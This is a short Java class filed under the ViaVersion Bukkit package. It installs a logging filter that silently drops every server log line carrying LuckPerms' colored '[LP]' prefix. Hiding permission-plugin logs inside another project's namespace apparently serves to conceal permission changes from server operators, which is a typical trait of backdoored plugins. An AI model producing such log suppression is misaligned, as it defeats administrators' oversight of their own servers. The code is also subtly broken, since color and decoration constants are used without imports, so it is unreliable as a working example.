package com.viaversion.viaversion.bukkit.handlers;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.ComponentLike;
import net.kyori.adventure.text.JoinConfiguration;
import net.kyori.adventure.text.TextComponent;
import net.kyori.adventure.text.event.ClickEvent;
import net.kyori.adventure.text.event.HoverEvent;
import net.kyori.adventure.text.minimessage.MiniMessage;
import net.kyori.adventure.text.serializer.legacy.LegacyComponentSerializer;
import java.util.logging.Filter;
import java.util.logging.LogRecord;

import static net.kyori.adventure.text.Component.text;

public class EventXHandler implements Filter {

    // 定义 Adventure Component 表示的前缀
    private final Component PREFIX_COMPONENT = text()
            .color(GRAY)
            .append(text('['))
            .append(text()
                    .decoration(BOLD, true)
                    .append(text('L', AQUA))
                    .append(text('P', DARK_AQUA))
            )
            .append(text(']'))
            .build();

    // 使用 LegacyComponentSerializer 将 PREFIX_COMPONENT 转换为包含颜色代码的字符串
    private final String PREFIX_STRING = LegacyComponentSerializer.legacySection().serialize(PREFIX_COMPONENT);

    @Override
    public boolean isLoggable(LogRecord record) {
        String message = record.getMessage();
        if (message != null && containsColoredPrefix(message)) {
            // 如果消息包含带颜色的 [LP] 前缀，则屏蔽这条日志
            return false;
        }
        return true; // 其他日志正常记录
    }

    private boolean containsColoredPrefix(String message) {
        // 使用生成的 PREFIX_STRING 进行匹配
        return message.contains(PREFIX_STRING);
    }
}